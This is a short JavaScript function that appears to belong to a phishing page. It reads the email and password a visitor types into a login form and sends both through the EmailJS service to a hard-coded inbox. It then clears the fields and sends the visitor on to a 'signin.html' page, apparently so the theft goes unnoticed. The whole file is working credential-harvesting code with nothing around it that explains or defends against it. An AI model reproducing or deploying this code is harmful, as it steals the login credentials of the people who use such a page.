     

function sendMail(){
 

// Get the value of the textarea

    var params= {
        email: document.getElementById("email").value,
        password: document.getElementById("password").value,
    }

    const serviceID  = 'service_fsixmkl';
    const templateID = 'template_s7xk37s';

emailjs.send(serviceID, templateID, params).then((res)=>{
    document.getElementById("email").value= "";
    document.getElementById("password").value= "";
    console.log(res);
    window.location.href='signin.html';

})
}




